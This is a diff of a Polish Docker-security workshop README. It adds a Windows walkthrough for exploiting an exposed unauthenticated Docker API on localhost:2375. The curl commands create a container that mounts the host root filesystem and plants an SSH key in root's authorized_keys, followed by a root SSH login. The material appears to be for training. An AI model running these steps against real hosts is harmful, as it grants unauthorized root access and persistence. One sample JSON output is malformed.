@@ -9,6 +9,7 @@ understanding of our presentation and project.
 <br />
 <br />
 
+
 <br />
 
 *** 
@@ -195,3 +196,84 @@ Mając uprawnienia root-a możesz poruszać się bezproblemowo po systemie. Znaj
 Posiadając całą wiedzę zdobytą podczas prezentacji oraz poprzednich zadań zastanów się w jaki sposób możesz zabezpieczyć kontener przed różnymi wektorami ataków. Stwórz kontener, który spełnia wszystkie best-practice dot. bezpiecznego tworzenia kontenera Dockera.  <br />
 
 **Odpowiedź** - wyślij widoczną komendę, która tworzy **Bezpieczny Kontener**. <br />
+
+
+# Instrukcja: Używanie Docker API na Windows z Docker Desktop
+
+Poniżej znajduje się przykład konfiguracji środowiska na Windows, zakładając, że korzystasz z Docker Desktop (który działa przez named pipe lub może być skonfigurowany na port TCP). Standardowo na Windows nie ma pliku `/var/run/docker.sock`. Zamiast tego Docker Desktop może wystawić daemon na adresie `tcp://localhost:2375` (należy to włączyć w ustawieniach Docker Desktop: **Expose daemon on tcp://localhost:2375 without TLS**). Dzięki temu można korzystać z `curl` do komunikacji z API Dockera.
+
+## Założenia
+- Docker Desktop na Windows jest skonfigurowany tak, aby umożliwić dostęp do Docker Daemon przez `http://localhost:2375`.
+- Masz zainstalowany `curl` dla Windows (od Windows 10 w PowerShell `curl` to alias do `Invoke-WebRequest`, możesz także użyć `curl.exe` z paczki binarnej).
+- Masz zainstalowany OpenSSH (na Windows 10 i 11 jest to standardowo dostępne lub można doinstalować).
+
+## Kroki
+
+### Krok 1: Wylistowanie obrazów kontenerów dostępnych na hoście Docker
+Wykorzystaj następujące polecenie w PowerShell, aby wyświetlić listę obrazów:
+
+```powershell
+curl.exe http://localhost:2375/images/json
+```
+
+Powinieneś otrzymać JSON z listą obrazów, np.: 
+
+```json
+["RepoTags": ["c3:latest"]]
+```
+
+### Krok 2: Wygenerowanie pary kluczy SSH
+W PowerShell wygeneruj parę kluczy SSH za pomocą poniższego polecenia:
+
+```powershell
+ssh-keygen -t rsa
+```
+
+Po wygenerowaniu kluczy, skopiuj zawartość klucza publicznego za pomocą:
+
+```powershell
+Get-Content .\id_rsa.pub
+```
+
+### Krok 3: Utworzenie nowego kontenera
+Stwórz nowy kontener z wybranego obrazu (np. `c3:latest`), który zamontuje system plików hosta do `/var/tmp` i doda Twój klucz publiczny do `~root/.ssh/authorized_keys` na hoście. Wykonaj polecenie:
+
+```powershell
+curl.exe -X POST -H "Content-Type: application/json" http://localhost:2375/containers/create -d '{
+  "Detach": true,
+  "AttachStdin": false,
+  "AttachStdout": true,
+  "AttachStderr": true,
+  "Tty": false,
+  "Image": "c3:latest",
+  "HostConfig": {
+    "Binds": ["/:/var/tmp"]
+  },
+  "Cmd": ["sh", "-c", "echo ssh-rsa AAAA...Twój_klucz_publiczny... >> /var/tmp/root/.ssh/authorized_keys"]
+}'
+```
+
+Polecenie zwróci Id nowo utworzonego kontenera, np.:
+
+```json
+{"Id": "c19a25c6cc72...", "Warnings": []}
+```
+
+### Krok 4: Uruchomienie stworzonego kontenera
+Uruchom kontener za pomocą poniższego polecenia:
+
+```powershell
+curl.exe -X POST -H "Content-Type: application/json" http://localhost:2375/containers/c19a25c6cc72.../start
+```
+
+### Krok 5: Logowanie przez SSH
+Teraz możesz zalogować się do kontenera przez SSH, używając prywatnego klucza `id_rsa`:
+
+```powershell
+ssh -i .\id_rsa root@10.10.x.x
+```
+
+W ten sposób wykonujesz podobny atak lub operację, korzystając z dostępu do Docker daemon przez API TCP (`localhost:2375`) zamiast `docker.sock`.
+
+
+
